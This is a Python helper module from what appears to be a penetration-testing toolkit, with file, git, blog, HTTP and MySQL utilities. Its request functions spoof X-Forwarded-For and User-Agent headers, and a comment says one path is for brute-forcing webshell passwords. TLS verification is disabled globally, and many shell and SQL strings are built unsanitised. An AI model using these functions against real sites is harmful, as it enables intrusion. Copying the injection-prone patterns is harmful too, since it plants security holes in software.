# -*- coding: utf-8 -*-
import sys
if sys.version_info>=(3,0,0):
    PY=3
    import importlib,sys
    importlib.reload(sys)
    #sys.setdefaultencoding('utf-8')
else:
    PY=2
    import sys
    reload(sys)
    sys.setdefaultencoding('utf-8')


#upon 4 lines for chinese support

#############################################################
### ___ /           _ |  _ \ _) |
###   _ \\ \  / __ \  | |   | | __|
###    ) |`  <  |   | | |   | | |
### ____/ _/\_\ .__/ _|\___/ _|\__|
###            _|
###
### name: exp10it.py
### function: my module
### date: 2016-08-05
### author: quanyechavshuo
### blog: https://3xp10it.github.io
#############################################################


import os
import re
import random
import time
import urllib.request, urllib.parse, urllib.error
import urllib.request, urllib.error, urllib.parse
import platform
import glob
import datetime
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import threading
import queue
from multiprocessing.dummy import Pool as ThreadPool

from select import select
from time import sleep
try:
    from blessings import Terminal
except:
    if PY==2:
        os.system("pip install blessings")
        from blessings import Terminal
    else:
        os.system("pip3 install blessings")
        from blessings import Terminal
try:
    from progressive.bar import Bar
    from progressive.tree import ProgressTree, Value, BarDescriptor
except:
    if PY==2:
        os.system("pip install progressive")
        from progressive.bar import Bar
        from progressive.tree import ProgressTree, Value, BarDescriptor
    else:
        os.system("pip3 install progressive")
        from progressive.bar import Bar
        from progressive.tree import ProgressTree, Value, BarDescriptor

if sys.version_info >= (2, 7, 9):
    import ssl
    ssl._create_default_https_context = ssl._create_unverified_context

try:
    import config
except:
    pass

import pymysql
pymysql.install_as_MySQLdb()

def tab_complete_file_path():
    #this is a function make system support Tab key complete file_path
    #works on linux,it seems windows not support readline module
    import platform
    import glob
    def tab_complete_for_file_path():
        class tabCompleter(object):
                """
                A tab completer that can either complete from
                the filesystem or from a list.
                Partially taken from:
                http://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
                source code:https://gist.github.com/iamatypeofwalrus/5637895
                """

                def pathCompleter(self,text,state):
                    """
                    This is the tab completer for systems paths.
                    Only tested on *nix systems
                    """
                    line   = readline.get_line_buffer().split()
                    return [x for x in glob.glob(text+'*')][state]

                def createListCompleter(self,ll):
                    """
                    This is a closure that creates a method that autocompletes from
                    the given list.
                    Since the autocomplete function can't be given a list to complete from
                    a closure is used to create the listCompleter function with a list to complete
                    from.
                    """
                    def listCompleter(text,state):
                        line   = readline.get_line_buffer()
                        if not line:
                            return [c + " " for c in ll][state]
                        else:
                            return [c + " " for c in ll if c.startswith(line)][state]
                    self.listCompleter = listCompleter
        t = tabCompleter()
        t.createListCompleter(["ab","aa","bcd","bdf"])

        readline.set_completer_delims('\t')
        readline.parse_and_bind("tab: complete")
        #readline.set_completer(t.listCompleter)
        #ans = raw_input("Complete from list ")
        #print ans
        readline.set_completer(t.pathCompleter)


    if platform.system()=="Linux":
        try:
            import readline
            tab_complete_for_file_path()
        except:
            os.system("pip install readline")
            tab_complete_for_file_path()
    else:
        try:
            import readline
        except:
            pass

#execute the function to take effect
tab_complete_file_path()

def figlet2file(logo_str,file_abs_path,print_or_not):
    #输出随机的logo文字到文件或屏幕,第二个参数为任意非文件的参数时(eg.0,1,2),只输出到屏幕
    #apt-get install figlet
    #man figlet
    #figure out which is the figlet's font directory
    #my figlet font directory is:
    #figlet -I 2,output:/usr/share/figlet

    try:
        f=os.popen("figlet -I 2")
        all=f.readlines()
        f.close()
        figlet_font_dir=all[0][:-1]
    except:
        os.system("apt-get install figlet")
        f=os.popen("figlet -I 2")
        all=f.readlines()
        f.close()
        figlet_font_dir=all[0][:-1]

    all_font_name_list=get_all_file_name(figlet_font_dir,['tlf','flf'])
    random_font=random.choice(all_font_name_list)
    unsucceed=os.system("figlet -t -f %s %s > /tmp/3" % (random_font,logo_str))
    if(unsucceed==1):
        print("something wrong with figlet,check the command in python source file")
    try:
        os.system("cat /tmp/3 >> %s" % file_abs_path)
    except:
        pass
    if(print_or_not==True):
        os.system("cat /tmp/3")
    os.system("rm /tmp/3")

def oneline2nline(oneline,nline,file_abs_path):
    #将文件中的一行字符串用多行字符串替换,调用时要将"多行字符串的参数(第二个参数)"中的换行符设置为\n
    tmpstr=nline.replace('\n','\\\n')
    os.system("sed '/%s/c\\\n%s' %s > /tmp/1" % (oneline,tmpstr,file_abs_path))
    os.system("cat /tmp/1 > %s && rm /tmp/1" % file_abs_path)
    pass

def lin2win(file_abs_path):
    #将linux下的文件中的\n换行符换成win下的\n\n换行符
    input_file=file_abs_path
    f=open(input_file,"r+")
    urls=f.readlines()
    f.close()
    os.system("rm %s" % file_abs_path)
    f1=open(file_abs_path,"a+")
    for url in urls:
    	print(url[0:-1])
    	#print url is different with print url[0:-1]
    	#print url[0:-1] can get the pure string
    	#while print url will get the "unseen \n"
    	#this script can turn a file with strings
    	#end with \n into a file with strings end
    	#with \r\n to make it comfortable move the
    	#txt file from *nix to win,coz the file with
    	#strings end with \n in *nix is ok for human
    	#to see "different lines",but this kind of file
    	#will turn "unsee different lines" in win
    	f1.write(url[0:-1]+"\r\n")
    f1.close()


#attention:
#由于此处tmp_get_file_name_value和tmp_all_file_name_list在函数外面,so
#在其他代码中调用get_all_file_name()时要用from name import *,不用import name,否则不能调用到get_all_file_name的功能
tmp_get_file_name_value=0
tmp_all_file_name_list=[]
def get_all_file_name(folder,ext_list):
    #exp_list为空时,得到目录下的所有文件名,不返回空文件夹名
    #返回结果为文件名列表,不是完全绝对路径名
    #eg.folder="/root"时,当/root目录下有一个文件夹a,一个文件2.txt,a中有一个文件1.txt
    #得到的函数返回值为['a/1.txt','2.txt']
    global tmp_get_file_name_value
    global root_dir
    global tmp_all_file_name_list
    tmp_get_file_name_value+=1
    if tmp_get_file_name_value==1:
        if folder[-1]=='/':
            root_dir=folder[:-1]
        else:
            root_dir=folder

    allfile=os.listdir(folder)
    for each in allfile:
        each_abspath=os.path.join(folder,each)
        if os.path.isdir(each_abspath):
            get_all_file_name(each_abspath,ext_list)
        else:
            #print each_abspath
            if len(each_abspath)>len(root_dir)+1+len(os.path.basename(each)):
                filename=each_abspath[len(root_dir)+1:]
                #print filename
                if len(ext_list)==0:
                    tmp_all_file_name_list.append(filename)
                else:
                    for each_ext in ext_list:
                        if(filename.split('.')[-1]==each_ext):
                            #print filename
                            tmp_all_file_name_list.append(filename)
            else:
                #print each
                if len(ext_list)==0:
                    tmp_all_file_name_list.append(each)
                else:
                    for each_ext in ext_list:
                        if(each.split('.')[-1]==each_ext):
                            #print each
                            tmp_all_file_name_list.append(each)

    return tmp_all_file_name_list


def save2github(file_abs_path,repo_name,comment):
    #将文件上传到github
    #arg1:文件绝对路经
    #arg2:远程仓库名
    #提交的commit注释
    local_resp_path="/root/"+repo_name
    filename=os.path.basename(file_abs_path)
    remote_resp_url="https://github.com/3xp10it/%s.git" % repo_name
    if os.path.exists(local_resp_path) is False:
        os.system("mkdir %s && cd %s && git init && git pull %s && git remote add origin %s && git status" % (local_resp_path,local_resp_path,remote_resp_url,remote_resp_url))
        if os.path.exists(local_resp_path+"/"+filename) is True:
            print("warning!warning!warning! I will exit! There exists a same name script in local_resp_path(>>%s),and this script is downloaded from remote github repo,you should rename your script if you want to upload it to git:)" % local_resp_path+"/"+filename)
            print("or if you want upload it direcly,I will replace it to this script you are writing and then upload normally. ")
            print("y/n? default[N]:>")
            choose=input()
            if choose!='y' and choose!='Y':
                return False

        os.system("cp %s %s" % (file_abs_path,local_resp_path))
        succeed=os.system("cd %s && git add . && git status && git commit -a -m '%s' && git push -u origin master" % (local_resp_path,comment))
        if(succeed==0):
            print("push succeed!!!")
            return True
        else:
            print("push to git wrong,wrong,wrong,check it!!!")
            return False

    if os.path.exists(local_resp_path) is True and os.path.exists(local_resp_path+"/.git") is False:
        if os.path.exists(local_resp_path+"/"+filename) is True:
            print("warning!warning!warning! I will exit! There exists a same name script in local_resp_path(>>%s),you should rename your script if you want to upload it to git:)" % local_resp_path+"/"+filename)
            print("or if you want upload it direcly,I will replace it to this script you are writing and then upload normally. ")
            print("y/n? default[N]:>")
            choose=input()
            if choose!='y' and choose!='Y':
                return False
        os.system("mkdir /tmp/codetmp")
        os.system("cd %s && cp -r * /tmp/codetmp/ && rm -r * &&  git init && git pull %s" % (local_resp_path,remote_resp_url))
        os.system("cp -r /tmp/codetmp/* %s && rm -r /tmp/codetmp" % local_resp_path)
        os.system("cp %s %s" % (file_abs_path,local_resp_path))
        succeed=os.system("cd %s && git add . && git status && git commit -a -m '%s' && git remote add origin %s && git push -u origin master" % (local_resp_path,comment,remote_resp_url))
        if(succeed==0):
            print("push succeed!!!")
            return True
        else:
            print("push to git wrong,wrong,wrong,check it!!!")
            return False

    if os.path.exists(local_resp_path) is True and os.path.exists(local_resp_path+"/.git") is True:
        #如果本地local_resp_path存在,且文件夹中有.git,当local_resp_path文件夹中的文件与远程github仓库中的文件不一致时,
        #且远程仓库有本地仓库没有的文件,选择合并本地和远程仓库并入远程仓库,所以这里采用一并重新合并的处理方法,
        #(与上一个if中的情况相比,多了一个合并前先删除本地仓库中的.git文件夹的动作),
        #虽然当远程仓库中不含本地仓库没有的文件时,不用这么做,但是这样做也可以处理那种情况
        if os.path.exists(local_resp_path+"/"+filename) is True:
            print("warning!warning!warning! I will exit! There exists a same name script in local_resp_path(>>%s),you should rename your script if you want to upload it to git:)" % local_resp_path+"/"+filename)
            print("or if you want upload it direcly,I will replace it to this script you are writing and then upload normally. ")
            print("y/n? default[N]:>")
            choose=input()
            if choose!='y' and choose!='Y':
                return False

        os.system("cd %s && rm -r .git" % local_resp_path)
        os.system("mkdir /tmp/codetmp")
        os.system("cd %s && cp -r * /tmp/codetmp/ && rm -r * && git init && git pull %s" % (local_resp_path,remote_resp_url))
        os.system("cp -r /tmp/codetmp/* %s && rm -r /tmp/codetmp" % local_resp_path)
        os.system("cp %s %s" % (file_abs_path,local_resp_path))
        succeed=os.system("cd %s && git add . && git status && git commit -a -m '%s' && git remote add origin %s && git push -u origin master" % (local_resp_path,comment,remote_resp_url))
        if(succeed==0):
            print("push succeed!!!")
            return True
        else:
            print("push to git wrong,wrong,wrong,check it!!!")
            return False

def get_os_type():
    #获取操作系统类型,返回结果为"Windows"或"Linux"
    return platform.system()

def post_request(url,data):
    #发出post请求
    #第二个参数是要提交的数据,要求为字典格式
    #返回值为post响应的html正文内容
    try:
        import mechanize
    except:
        os.system("pip install mechanize")
        import mechanize
    try:
        import http.cookiejar
    except:
        os.system("pip install cookielib")
        import http.cookiejar

    tried=0
    connected = False
    try:
        br = mechanize.Browser()
        cj = http.cookiejar.LWPCookieJar()
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_gzip(False)#used to be True
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        br.set_debug_http(False)
        ua=get_random_ua()
        x_forwarded_for=get_random_x_forwarded_for()
        br.addheaders = [('User-agent', '%s' % ua),('X-Forwarded-For','%s' % x_forwarded_for)]


        try:
            #能找到表单情况下的post动作(提交表单)
            response = br.open(url)
            br.select_form(nr=0)
            br.form.set_all_readonly(False)
            for each in list(data.keys()):
                br.form[each]=data[each]
            br.submit()
            content=br.response().read()
        except:
            #不能找到表单情况下的post动作(用于爆破一句话)
            data=urllib.parse.urlencode(data)
            r=br.open(url,data)
            #or:content=r.read()
            content=br.response().read()

    except mechanize.HTTPError as e:
        code=e.code
        content=e.read()

    return_value=content
    #print return_value
    return return_value

def get_random_ua():
    #得到随机user-agent值
    f=open("dicts/user-agents.txt","r+")
    all_user_agents=f.readlines()
    f.close()
    random_ua_index=random.randint(0,len(all_user_agents)-1)
    ua=re.sub(r"(\s)$","",all_user_agents[random_ua_index])
    return ua

def get_random_x_forwarded_for():
    #得到随机x-forwarded-for值
    numbers = []
    while not numbers or numbers[0] in (10, 172, 192):
        numbers = random.sample(range(1, 255), 4)
    return '.'.join(str(_) for _ in numbers)


def get_request(url):
    #发出get请求,返回值为一个字典,有三个键值对:eg.{"code":200,"title":None,"content":""}
    #code是int类型
    #title如果没有则返回None,有则返回str类型
    #content如果没有则返回""
    try:
        import mechanize
    except:
        os.system("pip install mechanize")
        import mechanize
    try:
        import http.cookiejar
    except:
        os.system("pip install cookielib")
        import http.cookiejar
    try:
        br = mechanize.Browser()
        br.set_cookiejar(http.cookiejar.LWPCookieJar()) # Cookie jar
        br.set_handle_equiv(True) # Browser Option
        br.set_handle_gzip(False)# use to be True
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        ua=get_random_ua()
        x_forwarded_for=get_random_x_forwarded_for()
        br.addheaders = [('User-agent', '%s' % ua),('X-Forwarded-For','%s' % x_forwarded_for)]
        br.open(url)
        br._factory.is_html = True
        code=br.response().code
        title=br.title()
        content=br.response().read()
    except mechanize.HTTPError as e:
        code=e.code
        content=e.read()
        soup=BeautifulSoup(content,"lxml")
        title=soup.title.string
    return_value={'code':code,'title':title,'content':content}
    #print return_value
    return return_value

def get_response_key_value_from_url(url):
    #得到url响应的关键参数的值
    #包括:响应状态码,url的title,响应的html内容
    #发出get请求,返回值为一个字典,有三个键值对:eg.{"code":200,"title":None,"content":content}
    #code是int类型
    #title如果没有则返回None,有则返回str类型
    #content如果没有则返回""
    return get_request(url)

def get_urls_from_file(file):
    #从文件中获取所有url
    f=open(file,"r+")
    content=f.read()
    #print content
    f.close()
    allurls=[]
    all=re.findall('(http(\S)+)',content,re.I)
    for each in all:
        allurls.append(each[0])
    #print allurls
    return allurls

def get_title_from_file(file):
    #等到文件中的所有url对应的title
    target_allurls=get_urls_from_file(file)
    print("a output file:/tmp/result.txt")
    writed_urls=[]
    for each in target_allurls:
        f=open("/tmp/result.txt","a+")
        tmp=urlparse(each)
        http_domain=tmp.scheme+'://'+tmp.hostname
        title=get_response_key_value_from_url(http_domain)['title']
        time.sleep(1)
        try:
            if http_domain not in writed_urls:
                each_line_to_write=http_domain+'\r\n'+'upon url is:'+title+'\r\n'
                print(each_line_to_write)
                f.write(each_line_to_write)
                writed_urls.append(http_domain)
        except:
            pass
    f.close()



def check_file_has_logo(file_abs_path):
    a = '### blog: https://3xp10it.github.io'
    with open(file_abs_path,'r') as foo:
        for line in foo.readlines():
            if a in line:
                foo.close()
                return True
        foo.close()
        return False

def write_code_header_to_file(file_abs_path,function,date,author,blog):
    f=open(file_abs_path,"a+")
    first_line="#############################################################\n"
    f.write(first_line)
    f.close()
    figlet2file("3xp10it",file_abs_path,False)
    f=open(file_abs_path,"a+")
    all=f.readlines()
    f.close()
    f=open("/tmp/1","a+")
    for each in all:
        if(each[0:40]!="#"*40):
            f.write("### "+each)
        else:
            f.write(each)
    f.close()
    os.system("cat /tmp/1 > %s && rm /tmp/1" % file_abs_path)
    #os.system("cat %s" % file_abs_path)

    f=open(file_abs_path,"a+")
    filename=os.path.basename(file_abs_path)

    f.write("###                                                          \n")
    f.write("### name: %s" % filename+'\n')
    f.write("### function: %s" % function+'\n')
    f.write("### date: %s" % str(date)+'\n')
    f.write("### author: %s" % author+'\n')
    f.write("### blog: %s" % blog+'\n')
    f.write("#############################################################\n")
    if file_abs_path.split(".")[-1]=='py':
        f.write('''# -*- coding: utf-8 -*-\nimport sys\nreload(sys)\nsys.setdefaultencoding('utf-8')\n#upon 4 lines for chinese support\nimport time\nfrom exp10it import *\nfiglet2file("3xp10it","/tmp/figletpic",True)\ntime.sleep(1)\n\n''')
    f.close()

def insert_code_header_to_file(file_abs_path,function,date,author,blog):
    all_lines=[]
    f=open(file_abs_path,"a+")
    all_lines=f.readlines()
    f.close()
    write_code_header_to_file("/tmp/2",function,date,author,blog)
    f=open("/tmp/2","a+")
    if file_abs_path.split(".")[-1]=='py':
        f.write('''# -*- coding: utf-8 -*-\nimport sys\nreload(sys)\nsys.setdefaultencoding('utf-8')\n#upon 4 lines for chinese support\nimport time\nfrom exp10it import *\nfiglet2file("3xp10it","/tmp/figletpic",True)\ntime.sleep(1)\n\n''')
    for each in all_lines:
        f.write(each)
    f.close()
    os.system("cat /tmp/2 > %s && rm /tmp/2" % file_abs_path)
    filename=os.path.basename(file_abs_path)
    os.system("sed -i 's/### name: %s/### name: %s/g' %s" % ('2',filename,file_abs_path))

def newscript():
    #快速写脚本,加logo,写完后可选上传到github
    figlet2file("3xp10it","/tmp/figletpic",True)
    time.sleep(1)
    while 1:
        print("1>write a new script")
        print("2>open and edit a exist script")
        print("your chioce:1/2 default[1]:>",end='')
        tmp=input()
        if(tmp!=str(2)):
            print("please input your file_abs_path:>",end='')
            file_abs_path=input()
            if(os.path.exists(file_abs_path)==True):
                print("file name exists,u need to change the file name,or if you really want the name,it will replace the original file!!!")
                print("replace the original file? Or you want to edit(e/E for edit) the file direcly?")
                print(" y/n/e[N]:>", end=' ')
                choose=input()
                if(choose!='y' and choose!='Y' and choose!='e' and choose!='E'):
                    continue
                elif(choose=='y' or choose=='Y'):
                    os.system("rm %s" % file_abs_path)
                    print("please input the script function:)")
                    function=input()
                    date=datetime.date.today()
                    author="quanyechavshuo"
                    blog="https://3xp10it.github.io"
                    if(False==check_file_has_logo(file_abs_path)):
                        insert_code_header_to_file(file_abs_path,function,date,author,blog)
                    break
            print("please input the script function:)")
            function=input()
            date=datetime.date.today()
            author="quanyechavshuo"
            blog="https://3xp10it.github.io"
            if False==check_file_has_logo(file_abs_path) and os.path.basename(file_abs_path)!="newscript.py" and "exp10it.py"!=os.path.basename(file_abs_path):
                insert_code_header_to_file(file_abs_path,function,date,author,blog)
            break
        else:
            print("please input your file_abs_path to edit:>", end=' ')
            file_abs_path=input()
            if os.path.exists(file_abs_path) is False:
                print("file not exist,do you want to edit it and save it as a new file?[y/N] default[N]:>", end=' ')
                choose=input()
                if choose=='y' or choose=='Y':
                    if("exp10it.py"!=os.path.basename(file_abs_path)):
                        print("please input the script function:)")
                        function=input()
                        date=datetime.date.today()
                        author="quanyechavshuo"
                        blog="https://3xp10it.github.io"

                        insert_code_header_to_file(file_abs_path,function,date,author,blog)
                        break
                    else:
                        print("warning! you are edit a new file named 'exp10it',this is special,you know it's your python module's name,so I will exit:)")


                else:
                    continue
            else:
                if(False==check_file_has_logo(file_abs_path) and "exp10it.py"!=os.path.basename(file_abs_path) and "newscript.py"!=os.path.basename(file_abs_path)):
                    print("please input the script function:)")
                    function=input()
                    date=datetime.date.today()
                    author="quanyechavshuo"
                    blog="https://3xp10it.github.io"
                    insert_code_header_to_file(file_abs_path,function,date,author,blog)
                    break
                else:
                    print("please input the script function:)")
                    function=input()
                    date=datetime.date.today()
                    author="quanyechavshuo"
                    blog="https://3xp10it.github.io"
                    break

    os.system("vim %s" % file_abs_path)
    print("do you want this script upload to github server? Y/n[Y]:")
    choose=input()
    if choose!='n':
        print("please input your remote repository name:)")
        repo_name=input()
        succeed=save2github(file_abs_path,repo_name,function)
        if(succeed==True):
            print("all is done and all is well!!!")
        else:
            print("save2github wrong,check it,maybe your remote repository name input wrong...")



def blog():
    #便捷写博客(jekyll+github)函数
    date=datetime.date.today()
    print("please input blog article title:)")
    title=input()
    print("please input blog categories:)")
    categories=input()
    print("please input blog tags,use space to separate:)")
    tags=input()
    tags_list=tags.split(' ')
    tags_write_to_file=""
    for each in tags_list:
        tags_write_to_file+=(' - '+each+'\\\n')
    tags_write_to_file=tags_write_to_file[:-2]


    article_title=title
    title1=title.replace(' ','-')
    filename=str(date)+'-'+title1+'.md'

    file_abs_path="/root/myblog/_posts/"+filename
    os.system("cp /root/myblog/_posts/*webshell* %s" % file_abs_path)
    os.system("sed -i 's/^title.*/title:      %s/g' %s" % (title,file_abs_path))
    os.system("sed -i 's/date:       .*/date:       %s/g' %s" % (str(date),file_abs_path))
    os.system("sed -i 's/summary:    隐藏webshell的几条建议/summary:    %s/g' %s" % (title,file_abs_path))
    os.system("sed -i '11,$d' %s" % file_abs_path)
    os.system("sed -i 's/categories: webshell/categories: %s/g' %s" % (categories,file_abs_path))
    os.system("sed '/ - webshell/c\\\n%s' %s > /tmp/1" % (tags_write_to_file,file_abs_path))
    os.system("cat /tmp/1 > %s && rm /tmp/1" % file_abs_path)
    os.system("vim %s" % file_abs_path)

    print("do you want to update your remote 3xp10it.github.io's blog?")
    print("your chioce: Y/n,default[Y]:>", end=' ')
    upa=input()
    if(upa=='n' or upa=='N'):
        print('done!bye:D')
    else:
        unsucceed=os.system("bash /usr/share/mytools/up.sh")
        if(unsucceed==0):
            os.system("firefox %s" % "https://3xp10it.github.io")

def get_remain_time(start_time,biaoji_time,remain_time,jiange_num,changing_var,total_num):
    #显示完成一件事所需时间
    #start_time是开始进行时的时间变量
    #biaoji_time是用来标记每次经过jiange_num次数后的时间标记,biaoji_time是个"对当前函数全局"变量
    #remain_time是每隔jiange_num次后计算出的当前剩余完成时间
    #jiange_num是每间隔多少次计算处理速度
    #changing_var是会变化(从0到total_num)的变量
    #total_num是一件事的所有的次数
    #eg.show_remain_time(start[0],biaoji[0],temp_remain_time[0],20,current_num,230000)
    if changing_var==1:
        biaoji_time=start_time
        return time.strftime("%Hh%Mm%Ss",time.localtime(remain_time))
    else:
        if changing_var%jiange_num==0:
            nowtime=time.time()
            spend_time=nowtime-biaoji_time
            biaoji_time=nowtime
            speed=jiange_num/spend_time
            remain_time=(total_num-changing_var)/speed
            return time.strftime("%Hh%Mm%Ss",time.localtime(remain_time))
        else:
            return remain_time

def hunxiao(folder_path):
    #改变md5函数,简单的cmd命令达到混淆效果,可用于上传百度网盘
    #只适用于windows平台
    print("there will be a folder named 'new' which contains the new files,but attention!!! your files those are going to be handled,rename them to a normal name if the file name is not regular,otherwise,the os.system's cmd would not find the path")
    os.chdir(folder_path)
    all_files=os.listdir(".")
    os.system("echo 111 > hunxiao.txt")
    os.system("md new")
    for each in all_files:
        if each[:7]!="hunxiao" and each[-2:]!="py" and os.path.isdir(each) is False:
            #cmd="c:\\windows\\system32\\cmd.exe /c copy"
            ext=each.split('.')[-1]
            #print type(each[:-(len(ext)+1)])
            new_file_name="hunxiao_%s.%s" % (each[:-(len(ext)+1)],ext)
            cmd="c:\\windows\\system32\\cmd.exe /c copy %s /b + hunxiao.txt /a new\\%s.%s" % (each,new_file_name,ext)
            os.system(cmd)
            #print cmd
    os.system("del hunxiao.txt")


def check_string_is_ip(string):
    #检测输入的字符串是否是ip值,如果是则返回True,不是则返回False
    p = re.compile("^((?:(2[0-4]\d)|(25[0-5])|([01]?\d\d?))\.){3}(?:(2[0-4]\d)|(255[0-5])|([01]?\d\d?))$")
    if re.match(p,string):
        return True
    else:
        return False


def get_key_value_from_file(key,separator,file_abs_path):
    #从文件中获取指定关键字的值,第一个参数为关键字,第二个参数为分隔符,第三个参数为文件绝对路径
    #默认设置分隔符为":"和"="和" "和"    ",如果使用默认分隔符需要将第二个参数设置为'',也即无字符
    #如果不使用默认分隔符,需要设置第二个参数为string类型如"="
    separators=[]
    if separator=='':
        separators=['=',':',' ','    ']
    else:
        separators.append(separator)

    f=open(file_abs_path,"r+")
    all=f.readlines()
    f.close()
    for each in all:
        each=re.sub(r'(\s)',"",each)
        for sep in separators:
            find1=re.search(r"%s%s'(.*)'" % (key,sep),each)
            if find1:
                return find1.group(1)
            find2=re.search(r'''%s%s"(.*)"''' % (key,sep),each)
            if find2:
                return find2.group(1)
            find3=re.search(r'''%s%s([^'"]*)''' % (key,sep),each)
            if find3:
                return find3.group(1)

    return 0

def execute_sql_in_db(sql,db_name="mysql"):
    #执行数据库命令
    #返回值为fetchone()的返回值
    import config
    try:
        import MySQLdb
    except:
        #for ubuntu16.04 deal with install MySQLdb error
        os.system("apt-get install libmysqlclient-dev")
        os.system("easy_install MySQL-python")
        os.system("pip install MySQLdb")
        import MySQLdb

    try:
        conn=MySQLdb.connect(config.db_server,config.db_user,config.db_pass,db=config.db_name,port=3306,charset="utf8")
        conn.autocommit(1)
        cur=conn.cursor()
        cur.execute('SET NAMES utf8')
        cur.execute(sql)
        result=cur.fetchone()
        return result
    except:
        import traceback
        traceback.print_exc()
        #发生错误回滚
        conn.rollback()
    finally:
        cur.close()
        conn.close()


def write_string_to_sql(string,db_name,table_name,column_name,table_primary_key,table_primary_key_value):
    #eg.write_string_to_sql("lll","h4cktool","targets","scan_result","http_domain","https://www.baidu.com")
    #eg.write_string_to_sql(1,"h4cktool","urls","is_admin_login_url","url",current_url)
    #将string写入数据库
    #argv[1]:要写入的string
    #argv[2]:操作的数据库名
    #argv[3]:操作的表名
    #argv[4]:操作的列名
    #argv[5]:表的主键,默认为''(空)
    #argv[6]:表的主键值,默认为''(空)
    string=str(string)
    import config
    try:
        import MySQLdb
    except:
        #for ubuntu16.04 deal with install MySQLdb error
        os.system("apt-get install libmysqlclient-dev")
        os.system("easy_install MySQL-python")
        os.system("pip install MySQLdb")
        import MySQLdb

    try:
        conn=MySQLdb.connect(config.db_server,config.db_user,config.db_pass,db=config.db_name,port=3306,charset="utf8")
        conn.autocommit(1)
        cur=conn.cursor()
        cur.execute('SET NAMES utf8')
        sql0="select * from %s where %s='%s'" % (table_name,table_primary_key,MySQLdb.escape_string(table_primary_key_value))
        #print sql0
        cur.execute(sql0)
        result=cur.fetchone()
        if result==None:
            #print "this http_domain not exist,I will create a new record"
            #eg.
            #INSERT INTO targets(http_domain) VALUES('http://1234');
            #or
            #INSERT INTO targets (http_domain) VALUES ('http://1234');
            insert_new_http_domain="replace into %s(%s) values('%s')" % (table_name,table_primary_key,MySQLdb.escape_string(str(table_primary_key_value)))
            cur.execute(insert_new_http_domain)
            #insert动作要commit,select的查询动作不用commit,execute就可以得到结果,可以最后再commit
            #conn.commit()
            strings_to_write=string
        else:
            #dec is a key word in mysql,so we should add `` here
            sql1 = "select %s from %s where %s='%s'" % (column_name,table_name,table_primary_key,MySQLdb.escape_string(table_primary_key_value))
            #print sql1
            cur.execute(sql1)
            data=cur.fetchone()
            if data[0]=='':
                strings_to_write=string
            else:
                strings_to_write=data[0]+'\r\n'+string

        if (table_name==config.all_targets_table_name and column_name=="http_domain") or (table_name==config.all_urls_table_name and column_name=="url"):
            pass
        else:
            sql2 = "update %s set %s='%s' where %s='%s'" % (table_name,column_name,MySQLdb.escape_string(strings_to_write),table_primary_key,MySQLdb.escape_string(table_primary_key_value))
            #print sql2
            cur.execute(sql2)
            #print sql2
            conn.commit()
        #sql0="replace into %s(%s) values('%s') on duplicate key update %s=%s+'%s'" % (table_name,table_primary_key,table_primary_key_value,column_name,column_name,MySQLdb.escape_string(string))
        #cur.execute(sql0)

    except:
        import traceback
        traceback.print_exc()
        #发生错误回滚
        conn.rollback()
    finally:
        cur.close()
        conn.close()

def auto_write_string_to_sql(string,db_name,table_name,column_name,table_primary_key,table_primary_key_value):
    #自动写内容到数据库中,相比write_string_to_sql函数多了其他相关写内容到数据库的动作,会在将一个column内容写到数据库时
    #将其他的与之相关的可以确定的其他column中的可以填写的数据填入数据库
    #eg.targets表中填写http_domain时顺便填写domain
    #eg.urls表中填写url时顺便填写urls表中的http_domain
    #只多写相同表中的可写的column,不同表中的可写column暂时不写
    import config
    try:
        import MySQLdb
    except:
        #for ubuntu16.04 deal with install MySQLdb error
        os.system("apt-get install libmysqlclient-dev")
        os.system("easy_install MySQL-python")
        os.system("pip install MySQLdb")
        import MySQLdb
    #首先将该写的写进去,下面会再看看有没有其他可写的column
    write_string_to_sql(string,db_name,table_name,column_name,table_primary_key,table_primary_key_value)

    if table_name==config.all_targets_table_name and column_name!="domain":

        domain_column_has_content=False
        try:
            conn=MySQLdb.connect(config.db_server,config.db_user,config.db_pass,db=config.db_name,port=3306,charset="utf8")
            conn.autocommit(1)
            cur=conn.cursor()
            sql0="select domain from %s where http_domain='%s'" % (config.all_targets_table_name,MySQLdb.escape_string(table_primary_key_value))
            cur.execute(sql0)
            #result是一个元组,查询的结果在result[0]里面,result[0]是个u"" unicode string类型,如果查询内容为空则
            result=cur.fetchone()
            if result==None or result[0]=='':
                #如果domain内容为空才写,否则说明已经写过了就不再写入了
                domain_column_has_content=False
            else:
                domain_column_has_content=True
        except:
            import traceback
            traceback.print_exc()
            conn.rollback()
        finally:
            cur.close()
            conn.close()
        #此时table_primary_key是http_domain,eg.http://www.baidu.com形式
        if domain_column_has_content==False:
            write_string_to_sql(table_primary_key_value.split("//")[-1],db_name,table_name,"domain",table_primary_key,table_primary_key_value)

    if table_name==config.all_urls_table_name and column_name!="http_domain":
        #在写信息到数据库的urls表中时,把http_domain列顺便写进去
        http_domain_column_has_content=False
        try:
            conn=MySQLdb.connect(config.db_server,config.db_user,config.db_pass,db=config.db_name,port=3306,charset="utf8")
            conn.autocommit(1)
            cur=conn.cursor()
            sql1="select http_domain from %s where url='%s'" % (config.all_urls_table_name,MySQLdb.escape_string(table_primary_key_value))
            cur.execute(sql1)
            result=cur.fetchone()
            if result==None or result[0]=='':
                http_domain_column_has_content=False
            else:
                http_domain_column_has_content=True
        except:
            import traceback
            traceback.print_exc()
            conn.rollback()
        finally:
            cur.close()
            conn.close()
        #此时的table_primary_key是"url"
        if http_domain_column_has_content==False:
            write_string_to_sql(get_http_domain_from_url(table_primary_key_value),db_name,table_name,"http_domain",table_primary_key,table_primary_key_value)

def get_http_domain_pattern_from_url(url):
    #eg.从http://www.baidu.com/1/2.php中得到http://www.baidu.com的正则匹配类型
    #也即将其中的.替换成\.
    http_domain=get_http_domain_from_url(url)
    '''
    split_string=http_domain.split(".")
    part_num=len(split_string)
    new_http_domain=""
    for i in range(part_num):
        new_http_domain+=(split_string[i]+"\.")
    new_http_domain=new_http_domain[:-2]
    return new_http_domain
    '''
    #正则1句代码话顶6句代码
    return_value=re.sub(r'\.','\.',http_domain)
    return return_value


def check_webshell_url(url):
